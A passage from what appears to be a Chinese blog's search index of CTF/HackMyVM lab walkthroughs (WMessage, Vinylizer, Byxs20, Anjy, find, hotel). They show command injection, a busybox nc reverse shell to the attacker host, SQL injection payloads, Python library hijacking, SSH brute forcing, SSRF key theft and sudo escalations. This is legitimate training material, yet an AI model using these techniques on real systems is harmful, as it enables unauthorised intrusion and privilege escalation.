\"\\x31\\xc9\\xf7\\xe1\\x51\\xbf\\xd0\\xd0\\x8c\\x97\\xbe\\xd0\\x9d\\x96\\x91\\xf7\\xd7\\xf7\\xd6\\x57\\x56\\x89\\xe3\\xb0\\x0b\\xcd\\x80\")')) ; done\n~~~\n\n","tags":["靶机"],"categories":["HackMyVM"]},{"title":"HackmyVM-WMessage","url":"/2025/04/24/HackmyVM-WMessage/","content":"\n\n\n\n\n# 信息搜集\n\n~~~\n┌──(root㉿kali)-[~/Desktop/tmp]\n└─# arp-scan -l\nInterface: eth0, type: EN10MB, MAC: 00:0c:29:ff:66:80, IPv4: 192.168.31.129\nStarting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)\n192.168.31.1    0a:00:27:00:00:11       (Unknown: locally administered)\n192.168.31.2    08:00:27:77:9d:8a       PCS Systemtechnik GmbH\n192.168.31.158  08:00:27:06:63:ee       PCS Systemtechnik GmbH\n~~~\n\n192.168.31.158就是靶机ip地址\n\n~~~\n┌──(root㉿kali)-[~/Desktop/tmp]\n└─# nmap 192.168.31.158 -p-\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-04-24 01:26 EDT\nNmap scan report for 192.168.31.158\nHost is up (0.00070s latency).\nNot shown: 65533 closed tcp ports (reset)\nPORT   STATE SERVICE\n22/tcp open  ssh\n80/tcp open  http\nMAC Address: 08:00:27:06:63:EE (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\n\nNmap done: 1 IP address (1 host up) scanned in 13.31 seconds\n~~~\n\n# 80端口\n\n先注册一个账号，是一个留言板，输入`!mpstat`可以查看cup的状态，但是输入其他命令不行，猜测只能运行mpstat命令用分号拼接一下命令发现可以执行成功\n\n~~~\n!mpstat;id\nServer: Linux 5.10.0-19-amd64 (MSG) 04/24/25 _x86_64_ (1 CPU) 05:30:02 CPU %usr %nice %sys %iowait %irq %soft %steal %guest %gnice %idle 05:30:02 all 1.84 0.01 0.57 0.13 0.00 0.27 0.00 0.00 0.00 97.19 uid=33(www-data) gid=33(www-data) groups=33(www-data)\n~~~\n\n反弹一个shell\n\n# 提权\n\nsudo -l\n\n~~~\nwww-data@MSG:~$ sudo -l\nMatching Defaults entries for www-data on MSG:\n    env_reset, mail_badpass,\n    secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\n\nUser www-data may run the following commands on MSG:\n    (messagemaster) NOPASSWD: /bin/pidstat\n~~~\n\npidstat有一个-e参数可以监控执行的命令\n\n~~~\n sudo -u messagemaster /bin/pidstat -e bash\n~~~\n\n执行bash会自动退出，那就写一个公钥进去，home目录下没有.ssh先创建一个.ssh文件夹，然后cp进去一个authorized_keys\n\nssh登录\n\n# 提权root\n\n~~~\nmessagemaster@MSG:~$ sudo -l\nMatching Defaults entries for messagemaster on MSG:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\n\nUser messagemaster may run the following commands on MSG:\n    (ALL) NOPASSWD: /bin/md5sum\n~~~\n\n可以执行md5sum，在/var/www/文件夹下还有一个ROOTPASS,可以将root的密码进行md5加密\n\n~~~\nmessagemaster@MSG:/var/www$ ls -ll\ntotal 8\ndrwxrwxr-- 5 www-data www-data 4096 Nov 18  2022 html\n-rw-r----- 1 root     root       12 Nov 21  2022 ROOTPASS\n~~~\n\nROOTPASS的字节是12，说明ROOT的密码是11位的因为最后还有一个换行符，可以先将rockyou.txt里11位的密码先取出来\n\n~~~\ngrep -E \"^.{11}$\" /usr/share/wordlists/rockyou.txt >pass.txt\n~~~\n\n然后对每行进行md5加密\n\n~~~\n┌──(root㉿kali)-[~/Desktop/tmp]\n└─# for i in $(cat pass.txt);do echo $i|md5sum>>md5.txt ;done （有点慢）\n~~~\n\n再用paste将rockyou.txt和这个合并\n\n~~~\npaste -d ':' md5.txt /usr/share/wordlists/rockyou.txt >pass.txt\n~~~\n\n最后grep一下\n\n~~~\ngrep \"85c73111b30f9ede8504bb4a4b682f48\" pass.txt\n~~~\n\n可以得到root的密码是`Message5687`\n","tags":["靶机"],"categories":["HackMyVM"]},{"title":"HackmyVM-Vinylizer","url":"/2025/04/23/HackmyVM-Vinylizer/","content":"\n\n\n# 信息搜集\n\narp-scan -l\n\n~~~\n┌──(root㉿kali)-[~/Desktop/tmp]\n└─# arp-scan -l\nInterface: eth0, type: EN10MB, MAC: 00:0c:29:ff:66:80, IPv4: 192.168.31.129\nStarting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)\n192.168.31.1    0a:00:27:00:00:11       (Unknown: locally administered)\n192.168.31.2    08:00:27:8d:42:52       PCS Systemtechnik GmbH\n192.168.31.156  08:00:27:6d:ec:17       PCS Systemtechnik GmbH\n~~~\n\n192.168.31.156 就是靶机地址\n\n~~~\n┌──(root㉿kali)-[~/Desktop/tmp]\n└─# nmap 192.168.31.156 -p-\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-04-23 06:00 EDT\nNmap scan report for 192.168.31.156\nHost is up (0.0025s latency).\nNot shown: 65533 closed tcp ports (reset)\nPORT   STATE SERVICE\n22/tcp open  ssh\n80/tcp open  http\nMAC Address: 08:00:27:6D:EC:17 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\n\nNmap done: 1 IP address (1 host up) scanned in 14.73 seconds\n~~~\n\n# 80端口\n\n扫描目录只有一个登录的login.php不是弱口令，尝试sql注入\n\n~~~\n┌──(root㉿kali)-[~/Desktop/tmp]\n└─# sqlmap -u \"http://192.168.31.156/login.php\" --forms\n        ___\n       __H__\n ___ ___[\"]_____ ___ ___  {1.8.11#stable}\n|_ -| . [(]     | .'| . |\n|___|_  [)]_|_|_|__,|  _|\n      |_|V...       |_|   https://sqlmap.org\n\n[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program\n\n[*] starting @ 06:04:37 /2025-04-23/\n\n[06:04:37] [INFO] testing connection to the target URL\nyou have not declared cookie(s), while server wants to set its own ('PHPSESSID=0om6k37fejc...nqdkc3ihnt'). Do you want to use those [Y/n]\n\n[06:04:38] [INFO] searching for forms\n[1/1] Form:\nPOST http://192.168.31.156/login.php\nPOST data: username=&password=&login=\ndo you want to test this form? [Y/n/q]\n>\n\nEdit POST data [default: username=&password=&login=] (Warning: blank fields detected):\n\ndo you want to fill blank fields with random values? [Y/n]\n\n[06:04:38] [INFO] resuming back-end DBMS 'mysql'\n[06:04:38] [INFO] using '/root/.local/share/sqlmap/output/results-04232025_0604am.csv' as the CSV results file in multiple targets mode\nsqlmap resumed the following injection point(s) from stored session:\n---\nParameter: username (POST)\n    Type: time-based blind\n    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)\n    Payload: username=GcYl' AND (SELECT 7194 FROM (SELECT(SLEEP(5)))aupQ) AND 'jWGR'='jWGR&password=yoAl&login=bpLA\n---\ndo you want to exploit this SQL injection? [Y/n]\n\n[06:04:39] [INFO] the back-end DBMS is MySQL\nweb server operating system: Linux Ubuntu 22.04 (jammy)\nweb application technology: Apache 2.4.52\nback-end DBMS: MySQL >= 5.0.12\n[06:04:39] [INFO] you can find results of scanning in multiple targets mode inside the CSV file '/root/.local/share/sqlmap/output/results-04232025_0604am.csv'\n\n[*] ending @ 06:04:39 /2025-04-23/\n~~~\n\n存在时间盲注，可以注入出来用户和密码\n\n~~~\nTable: users\n[2 entries]\n+----+----------------------------------+-----------+----------------+\n| id | password                         | username  | login_attempts |\n+----+----------------------------------+-----------+----------------+\n| 1  | 9432522ed1a8fca612b11c3980a031f6 | shopadmin | 0              |\n| 2  | password123                      | lana      | 0              |\n+----+----------------------------------+-----------+----------------+\n~~~\n\nshopadmin的密码解密\n\n~~~\n9432522ed1a8fca612b11c3980a031f6:addicted2vinyl\n~~~\n\n然后ssh登录\n\n# 提权\n\nsudo -l查看\n\n~~~\nshopadmin@vinylizer:/usr/lib/python3$ sudo -l\nMatching Defaults entries for shopadmin on vinylizer:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin,\n    use_pty\n\nUser shopadmin may run the following commands on vinylizer:\n    (ALL : ALL) NOPASSWD: /usr/bin/python3 /opt/vinylizer.py\n~~~\n\n~~~\nshopadmin@vinylizer:/usr/lib/python3$ cat /opt/vinylizer.py\n# @Name: Vinylizer\n# @Author: MrMidnight\n# @Version: 1.8\n\nimport json\nimport random\n\ndef load_albums(filename):\n    try:\n        with open(filename, 'r') as file:\n            content = file.read()\n            if not content:\n                return []\n            albums = json.loads(content)\n    except FileNotFoundError:\n        albums = []\n    except json.JSONDecodeError:\n        print(f\"Error decoding JSON_Config: {filename}.\")\n        albums = []\n    return albums\n\n\ndef save_albums(filename, albums):\n    with open(filename, 'w') as file:\n        json.dump(albums, file, indent=None)\n\n\ndef print_albums(albums):\n    if not albums:\n        print(\"No albums available.\")\n    else:\n        print(\"Available Albums:\")\n        for album in albums:\n            print(f\"- {album['name']}, Sides: {', '.join(album['sides'])}\")\n\n\ndef randomize_sides(album):\n    sides = list(album['sides'])\n    random.shuffle(sides)\n    return {\"name\": album['name'], \"sides\": sides}\n\n\ndef randomize_vinyl(albums):\n    if not albums:\n        print(\"No albums available. Add one with 'A'.\")\n        return None, None\n\n    random_album = random.choice(albums)\n    random_side = random.choice(random_album['sides'])\n\n    return random_album['name'], random_side\n\n\ndef add_vinyl(albums, filename, name, num_sides):\n    # Generate sides from A to the specified number\n    sides = [chr(ord('A') + i) for i in range(num_sides)]\n\n    # Add new vinyl\n    new_album = {\"name\": name, \"sides\": sides}\n    albums.append(new_album)\n    save_albums(filename, albums)\n    print(f\"Album '{name}' with {num_sides} sides added successfully.\\n\")\n\n\ndef delete_vinyl(albums, filename, name):\n    for album in albums:\n        if album['name'] == name:\n            albums.remove(album)\n            save_albums(filename, albums)\n            print(f\"Album '{name}' deleted successfully!\\n\")\n            return\n    print(f\"Album '{name}' not found.\")\n\n\ndef list_all(albums):\n    print_albums(albums)\n\n\nif __name__ == \"__main__\":\n\n    # Banner. Dont touch!\n    print(\"o      'O                  o\\nO       o o               O  o\\no       O                 o\\no       o\n        O\\nO      O' O  'OoOo. O   o o  O  ooOO .oOo. `OoOo.\\n`o    o   o   o   O o   O O  o    o  OooO'  o\\n `o  O    O   O   o O   o o  O   O   O      O\\n  `o'     o'  o   O `OoOO Oo o' OooO `OoO'  o\\nBy: MrMidnight          o\\n\n           OoO'                         \\n\")\n\n    config_file = \"config.json\"\n\n    albums_config = load_albums(config_file)\n\n    while True:\n        choice = input(\"Do you want to (R)andomly choose a Album, (A)dd a new one, (D)elete an album, (L)ist all albums, or (Q)uit? : \").upper()\n\n        if choice == \"R\":\n            random_album, random_side = randomize_vinyl(albums_config)\n            if random_album is not None and random_side is not None:\n                print(f\"Randomly selected album: {random_album}, Random side: {random_side}\\n\")\n\n        elif choice == \"A\":\n            name = input(\"\\nEnter the name of the new album: \")\n\n            while True:\n                try:\n                    num_sides = int(input(\"Enter the number of sides for the new album: \"))\n                    break  # Break the loop if the input is a integer\n                except ValueError:\n                    print(\"\\nInvalid input. Please enter a valid integer for the number of sides.\")\n\n            add_vinyl(albums_config, config_file, name, num_sides)\n\n        elif choice == \"D\":\n            name = input(\"\\nEnter the name of the album to delete: \")\n            delete_vinyl(albums_config, config_file, name)\n\n        elif choice == \"L\":\n            list_all(albums_config)\n            print(\"\")\n\n        elif choice == \"Q\":\n            print(\"\\nQuitting Vinylizer.\")\n            break\n\n        else:\n            print(\"Invalid Input!\")\n~~~\n\n这个python文件没什么可以利用的，查找是否存在库劫持\n\n~~~\nfind / -writable 2>/dev/null\n/usr/lib/python3.10/random.py #可写\n~~~\n\n添加\n\n~~~\nimport os\nos.system(\"bash -p\")\n~~~\n\n然后sudo运行\n","tags":["靶机"],"categories":["HackMyVM"]},{"title":"群友机-Byxs20","url":"/2025/04/20/群友靶机-Byxs20/","content":"\n\n\n# 信息搜集\n\narp-scan -l 扫描靶机ip\n\n~~~\n┌──(root㉿kali)-[~/Desktop/tmp]\n└─# arp-scan -l\nInterface: eth0, type: EN10MB, MAC: 00:0c:29:ff:66:80, IPv4: 192.168.31.129\nStarting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)\n192.168.31.1    0a:00:27:00:00:11       (Unknown: locally administered)\n192.168.31.2    08:00:27:3d:c2:d3       PCS Systemtechnik GmbH\n192.168.31.149  08:00:27:9e:3d:15       PCS Systemtechnik GmbH\n\n3 packets received by filter, 0 packets dropped by kernel\nEnding arp-scan 1.10.0: 256 hosts scanned in 2.406 seconds (106.40 hosts/sec). 3 responded\n~~~\n\n然后nmap扫描一下开放端口\n\n~~~\n┌──(root㉿kali)-[~/Desktop/tmp]\n└─# nmap 192.168.31.149\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-04-20 06:02 EDT\nNmap scan report for 192.168.31.149\nHost is up (0.0018s latency).\nNot shown: 998 closed tcp ports (reset)\nPORT   STATE SERVICE\n22/tcp open  ssh\n80/tcp open  http\nMAC Address: 08:00:27:9E:3D:15 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\n\nNmap done: 1 IP address (1 host up) scanned in 6.85 seconds\n~~~\n\n# 80端口\n\ngobuster扫描一下目录\n\n~~~\n┌──(root㉿kali)-[~/Desktop/tmp]\n└─# gobuster dir -u \"192.168.31.149\" -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.tx\nt -x .php,.txt,.jpg\n===============================================================\nGobuster v3.6\nby OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)\n===============================================================\n[+] Url:                     http://192.168.31.149\n[+] Method:                  GET\n[+] Threads:                 10\n[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt\n[+] Negative Status codes:   404\n[+] User Agent:              gobuster/3.6\n[+] Extensions:              php,txt,jpg\n[+] Timeout:                 10s\n===============================================================\nStarting gobuster in directory enumeration mode\n===============================================================\n/.php                 (Status: 403) [Size: 279]\n/templates            (Status: 301) [Size: 320] [--> http://192.168.31.149/templates/]\n/template.php         (Status: 200) [Size: 258]\n/conf                 (Status: 301) [Size: 315] [--> http://192.168.31.149/conf/]\n/ping.php             (Status: 200) [Size: 11]\n~~~\n\n/template.php有一个虚假的文件包含（后面拿到shell之后查看文件可以知道）,ping.php可以执行ping命令，fuzz一下参数\n\n~~~\n┌──(root㉿kali)-[~/Desktop/tmp]\n└─# arjun -u \"http://192.168.31.149/ping.php\"\n    _\n   /_| _ '\n  (  |/ /(//) v2.2.7\n      _/\n\n[*] Scanning 0/1: http://192.168.31.149/ping.php\n[*] Probing the target for stability\n[*] Analysing HTTP response for anomalies\n[*] Logicforcing the URL endpoint\n[✓] parameter detected: debug, based on: http headers\n[+] Parameters found: debug\n~~~\n\n找到一个debug参数（其实一开始是想fuzz出了拼接ip的参数的，误打误撞），ip的参数就是ip\n\n~~~\nhttp://192.168.31.149/ping.php?debug&ip=;ls\n~~~\n\n可以拼接执行命令\n\n~~~\n#ping.php\n<?php\n// diag.php - 表面严格校验，实际暗藏调试后门\n$ip = $_GET['ip'] ?? '';\n\n// 暗桩触发条件：只要携带debug参数\nif(isset($_GET['debug'])){\n    // 关闭错误提示避免暴露路径\n    error_reporting(0);\n    \n    // 输出详细系统信息（伪装成调试模式）\n    echo \"<pre>\";\n    echo \"[*] Debug Mode Activated\\n\";\n    echo \"[+] Raw Command: ping -c 3 \" . $ip . \"\\n\";\n    \n    // 直接拼接命令执行（无任何过滤）\n    system(\"ping -c 3 \" . $ip);\n    \n    // 泄漏敏感信息\n    echo \"\\n\\n=== System Info ===\\n\";\n    echo \"PHP User: \" . shell_exec('whoami');\n    echo \"PHP Version: \" . phpversion() . \"\\n\";\n    echo \"Disable Functions: \" . ini_get('disable_functions') . \"\\n\";\n    echo \"</pre>\";\n    exit;\n}\n\n// 主功能：严格IPv4正则验证（无懈可击）\nif (!preg_match('/^(25[0-5]|2[0-4]\\d|1\\d{2}|[1-9]?\\d)\\.(25[0-5]|2[0-4]\\d|1\\d{2}|[1-9]?\\d)\\.(25[0-5]|2[0-4]\\d|1\\d{2}|[1-9]?\\d)\\.(25[0-5]|2[0-4]\\d|1\\d{2}|[1-9]?\\d)$/', $ip)) {\n    die(\"Invalid IP!\");\n}\n\n// 安全执行命令（无注入可能）\n$cmd = ['ping', '-c', '3', $ip];\nsystem(escapeshellcmd(implode(' ', $cmd)));\n?>\n~~~\n\n然后用busybox反弹shell\n\n~~~\n;busybox%20nc%20192.168.31.129%204444%20-e%20/bin/bash\n~~~\n\n拿到shell之后，查看sudo -l\n\n~~~\nwww-data@Byxs20:/tmp$ sudo -l\nMatching Defaults entries for www-data on Byxs20:\n    env_reset, mail_badpass,\n    secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bi\nn\n\nUser www-data may run the following commands on Byxs20:\n    (ALL : ALL) NOPASSWD: /usr/sbin/reboot\n~~~\n\n可以执行reboot\n\n上传一个pspy监控一下进程\n\n~~~\nwww-data@Byxs20:/tmp$ busybox wget 192.168.31.129/pspy64\n~~~\n\n可以看到root用户将`/var/www/html/conf/apache2.conf.bak` 复制到了`/etc/apache2/apache2.conf`\n\n~~~\n2025/04/20 06:11:01 CMD: UID=0     PID=749    | /bin/sh -c cp /var/www/html/conf/apache2.conf.bak  /etc/apache2/apache2.conf\n~~~\n\napache2.conf.bak文件是我们可控的，后面经过群主提醒我才幡然醒悟，可以做一个软连接啊，`/etc/apache2/apache2.conf`我们是可读的\n\n~~~\nwww-data@Byxs20:/var/www/html/conf$ ln -sf /home/welcome/user.txt apache2.conf.bak\nwww-data@Byxs20:/var/www/html/conf$ cat /etc/apache2/apache2.conf\nflag{user-05659dca555d4ddbc396b319645f3d2a}\nwww-data@Byxs20:/var/www/html/conf$ ln -sf /root/root.txt apache2.conf.bak\nwww-data@Byxs20:/var/www/html/conf$ cat /etc/apache2/apache2.conf\nflag{root-f9ef88715e3bbec612f9f88d64ae3a99}\n~~~\n\n另一个思路就是修改`apache2.conf.bak`，将web服务以welcome的权限运行，将apacke2.conf.bak里面的User和Group修改一下\n\n~~~\nUser welcome\nGroup welcome\n~~~\n\n然后上传再重启靶机，然后再次反弹shell会发现用户变成welcome了（这里不能修改成root，是因为apache2默认不允许root启动，如果要root启动，需要添加“-DBIG_SECURITY_HOLE”到CFLAGS环境变量中重新编译）\n\n~~~\nid\nuid=1000(welcome) gid=1000(welcome) groups=1000(welcome)\n~~~\n\n查看sudo -l\n\n~~~\nwelcome@Byxs20:/home/welcome$ sudo -l\nsudo -l\nMatching Defaults entries for welcome on Byxs20:\n    env_reset, mail_badpass,\n    secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\n\nUser welcome may run the following commands on Byxs20:\n    (ALL : ALL) NOPASSWD: /usr/sbin/reboot\n    (ALL : ALL) NOPASSWD: /home/welcome/test/test\n~~~\n\n就是王炸方案，将test目录换一个名再新创建一个test/test\n\n~~~\nwelcome@Byxs20:/home/welcome$ mv test 1\nmv test 1\nwelcome@Byxs20:/home/welcome$ mkdir test\nmkdir test\nwelcome@Byxs20:/home/welcome$ echo 'bash -p'>test/test\necho 'bash -p'>test/test\nwelcome@Byxs20:/home/welcome$ chmod +x test/test\nchmod +x test/test\nwelcome@Byxs20:/home/welcome$ sudo /home/welcome/test/test\nsudo /home/welcome/test/test\nroot@Byxs20:/home/welcome#\n~~~\n\n","tags":["靶机"],"categories":["660930334"]},{"title":"群友机-Anjy","url":"/2025/04/19/群友靶机-Anjy/","content":"\n\n\n\n\n\n\n# 信息搜集\n\narp-scan -l扫描靶机地址\n\n~~~\n┌──(root㉿kali)-[~/Desktop/tmp]\n└─# arp-scan -l\nInterface: eth0, type: EN10MB, MAC: 00:0c:29:ff:66:80, IPv4: 192.168.31.129\nStarting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)\n192.168.31.1    0a:00:27:00:00:11       (Unknown: locally administered)\n192.168.31.2    08:00:27:da:a9:b6       PCS Systemtechnik GmbH\n192.168.31.147  08:00:27:e8:2b:5e       PCS Systemtechnik GmbH\n\n3 packets received by filter, 0 packets dropped by kernel\n~~~\n\n192.168.31.147就是靶机ip，然后nmap扫描端口\n\n~~~\n┌──(root㉿kali)-[~/Desktop/tmp]\n└─# nmap 192.168.31.147\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-04-19 04:25 EDT\nNmap scan report for 192.168.31.147\nHost is up (0.0014s latency).\nNot shown: 998 closed tcp ports (reset)\nPORT   STATE SERVICE\n22/tcp open  ssh\n80/tcp open  http\nMAC Address: 08:00:27:E8:2B:5E (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\n\nNmap done: 1 IP address (1 host up) scanned in 6.88 seconds\n~~~\n\n# 80端口\n\n80端口是一个web页面存在ssrf漏洞，POST传参`url=file:///etc/passwd`，文件内容会进行base64加密\n\n可以读取到welcome这个用户，home目录下不存在id_rsa,读取/etc/ssh/sshd_config\n\n~~~\n#HostKey /etc/ssh/ssh_host_rsa_key\n#HostKey /etc/ssh/ssh_host_ecdsa_key\n#HostKey /etc/ssh/ssh_host_ed25519_key\n~~~\n\n然后挨个试试id_rsa,id_ecdsa,id_ed25519,可以发现存在`id_ed25519`\n\n~~~\nurl=file:///home/welcome/.ssh/id_ed25519\n~~~\n\n拿到私钥了就可以ssh登录了\n\n# 提权\n\n~~~\n┌──(root㉿kali)-[~/Desktop/tmp]\n└─# ssh welcome@192.168.31.147 -i id\nLinux Anjv 4.19.0-27-amd64 #1 SMP Debian 4.19.316-1 (2024-06-25) x86_64\n\nThe programs included with the Debian GNU/Linux system are free software;\nthe exact distribution terms for each program are described in the\nindividual files in /usr/share/doc/*/copyright.\n\nDebian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent\npermitted by applicable law.\nLast login: Sat Apr 19 04:31:17 2025 from 192.168.31.129\nwelcome@Anjv:~$\n~~~\n\nsudo -l可以发现elinks可以以root用户执行，可以直接读取root.txt，也可以任意文件读写，最简单的是再elinks终端按下esc->file->OS SHELL\n\n就可以获取到root的shell了\n","tags":["靶机"],"categories":["660930334"]},{"title":"HackmyVM-find","url":"/2025/04/19/HackmyVM-find/","content":"\n\n\n# 信息搜集\n\narp-scan -l\n\n~~~\n┌──(root㉿kali)-[~/Desktop/tmp]\n└─# arp-scan -l\nInterface: eth0, type: EN10MB, MAC: 00:0c:29:ff:66:80, IPv4: 192.168.31.129\nStarting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)\n192.168.31.1    0a:00:27:00:00:11       (Unknown: locally administered)\n192.168.31.2    08:00:27:dd:48:d1       PCS Systemtechnik GmbH\n192.168.31.145  08:00:27:19:2f:ed       PCS Systemtechnik GmbH\n~~~\n\n192.168.31.145是靶机ip，扫描一下端口\n\n~~~\n┌──(root㉿kali)-[~/Desktop/tmp]\n└─# nmap 192.168.31.145\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-04-18 23:23 EDT\nNmap scan report for 192.168.31.145\nHost is up (0.0022s latency).\nNot shown: 998 closed tcp ports (reset)\nPORT   STATE SERVICE\n22/tcp open  ssh\n80/tcp open  http\nMAC Address: 08:00:27:19:2F:ED (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\n\nNmap done: 1 IP address (1 host up) scanned in 6.86 seconds\n~~~\n\n扫描目录\n\n~~~\n┌──(root㉿kali)-[~/Desktop/tmp]\n└─# gobuster dir -u \"http://192.168.31.145/\" -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-m\nedium.txt -x .php,.txt,.jpg\n===============================================================\nGobuster v3.6\nby OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)\n===============================================================\n[+] Url:                     http://192.168.31.145/\n[+] Method:                  GET\n[+] Threads:                 10\n[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt\n[+] Negative Status codes:   404\n[+] User Agent:              gobuster/3.6\n[+] Extensions:              txt,php\n[+] Timeout:                 10s\n===============================================================\nStarting gobuster in directory enumeration mode\n===============================================================\n/cat.jpg              (Status: 200) [Size: 35137]\n/manual               (Status: 301) [Size: 317] [--> http://192.168.31.145/manual/]\n/robots.txt           (Status: 200) [Size: 13]\n/server-status        (Status: 403) [Size: 279]\n~~~\n\n# user.txt\n\nrobots.txt是让你找到user,把cat.jpg下载下来\n\n~~~\n┌──(root㉿kali)-[~/Desktop/tmp]\n└─# strings cat.jpg\n...\n>C<;_\"!~}|{zyxwvutsrqponmlkjihgfedcba`_^]\\[ZYXWVUTSRQPONMLKJ`_dcba`_^]\\Uy<XW\nVOsrRKPONGk.-,+*)('&%$#\"!~}|{zyxwvutsrqponmlkjihgfedcba`_^]\\[ZYXWVUTSRQPONML\nKJIHGFEDZY^W\\[ZYXWPOsSRQPON0Fj-IHAeR\n~~~\n\n最后一串字符串是[Malbolge](https://malbolge.doleczek.pl/)语言，跑一下得到`missyred`，然后hydra爆破密码\n\n~~~\n┌──(root㉿kali)-[~/Desktop/tmp]\n└─# hydra -l missyred -P /usr/share/wordlists/rockyou.txt 192.168.31.145 ssh\nHydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).\n\nHydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-04-18 23:30:36\n[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4\n[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task\n[DATA] attacking ssh://192.168.31.145:22/\n[22][ssh] host: 192.168.31.145   login: missyred   password: iloveyou\n~~~\n\nssh登录,sudo -l\n\n~~~\nmissyred@find:~$ sudo -l\n[sudo] password for missyred:\nMatching Defaults entries for missyred on find:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\n\nUser missyred may run the following commands on find:\n    (kings) /usr/bin/perl\n~~~\n\nperl提权到kings\n\n~~~\nmissyred@find:~$ sudo -u kings perl -e 'exec \"/bin/sh\";'\n~~~\n\n# root.txt\n\n~~~\nkings@find:~$ sudo -l\nMatching Defaults entries for kings on find:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\n\nUser kings may run the following commands on find:\n    (ALL) NOPASSWD: /opt/boom/boom.sh\n~~~\n\n/opt/boom/boom.sh是不存在的，我们可以自己创建，随便执行sh命令\n\n~~~\n#boom.sh\nbash -p\n~~~\n\nsudo /opt/boom/boom.sh\n\n提权到root.txt\n","tags":["靶机"],"categories":["HackMyVM"]},{"title":"HackmyVM-hotel","url":"/2025/04/19/HackmyVM-hotel/","content":"\n\n\n# 信息搜集\n\narp-scan -l\n\n~~~\n┌──(root㉿kali)-[~/Desktop/tmp]\n└─# arp-scan -l\nInterface: eth0, type: EN10MB, MAC: 00:0c:29:ff:66:80, IPv4: 192.168.31.129\nStarting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)\n192.168.31.1    0a:00:27:00:00:11       (Unknown: locally administered)\n192.168.31.2    08:00:27:f8:3e:94       PCS Systemtechnik GmbH\n192.168.31.144  08:00:27:5c:e1:4f       PCS Systemtechnik GmbH\n~~~\n\n192.168.31.144就是靶机ip，扫描端口\n\n~~~\nPORT   STATE SERVICE REASON\n22/tcp open  ssh     syn-ack ttl 64\n80/tcp open  http    syn-ack ttl 64\n~~~\n\n开启了22和80端口\n\n# user.txt\n\n80端口是一个hoteldruid，存在ndayhttps://github.com/kaal18/CVE-2022-22909#\n\n反弹一个shell出来，/var/www/html目录下有一个ttylog很可疑，用ttyplay可以重现当时录制的tty\n\n得到person的密码为\n\n~~~\nEndur4nc3.\n~~~\n\nssh登录，拿到user.txt\n\n# root.txt\n\nsudo -l\n\n~~~\nperson@hotel:~$ sudo -l\nMatching Defaults entries for person on hotel:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\n\nUser person may run the following commands on hotel:\n    (root) NOPASSWD: /usr/bin/wkhtmltopdf\n~~~\n\nsudo /usr/bin/wkhtmltopdf file:///root/root.txt 1.pdf可以拿到root.txt\n","tags":["靶机"],"categories":["HackMyVM"]},{"title":"春秋云镜-Initial","url":"/2025/04/18/春秋云镜-Initial/","content":"\n\n\n\n\n# FLAG1\n\n首先进行信息搜集\n\n~~~~\n┌──(root㉿kali)-[~/Desktop/tmp]\n└─# ../pentest/fscan/fscan2 -h 39.99.232.66\n┌──────────────────────────────────────────────┐\n│    ___                              _        │\n│   / _ \\     ___  ___ _ __ __ _  ___| | __    │\n│  / /_\\/____/ __|/ __| '__/ _` |/ __| |/ /    │\n│ / /_\\\\_____\\__ \\ (__| | | (_| | (__|   <     │\n│ \\____/     |___/\\___|_|  \\__,_|\\___|_|\\_\\    │\n└──────────────────────────────────────────────┘\n      Fscan Version: 2.0.0\n\n[2025-04-18 08:00:46] [INFO] 暴力破解线程数: 1\n[2025-04-18 08:00:46] [INFO] 开始信息扫描\n[2025-04-18 08:00:46] [INFO] 最终有效主机数量: 1\n[2025-04-18 08:00:46] [INFO] 开始主机扫描\n[2025-04-18 08:00:46] [INFO] 有效端口数量: 233\n[2025-04-18 